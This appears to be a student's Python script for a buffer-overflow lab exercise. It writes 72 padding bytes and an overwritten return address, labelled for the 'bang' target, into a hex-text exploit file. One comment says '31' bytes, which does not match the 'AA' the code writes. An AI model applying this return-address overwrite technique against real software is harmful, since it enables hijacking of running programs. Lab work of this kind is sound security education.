from struct import *

buf = ""
buf += ("AA" + " ")*72 #creates string with "31 31 31 31 ..x72
buf += "d8 33 68 55 " #return address for bang: little endian
f = open("exploit_bang.txt", "w") #sets up to write to file
f.write(buf) #writes to file

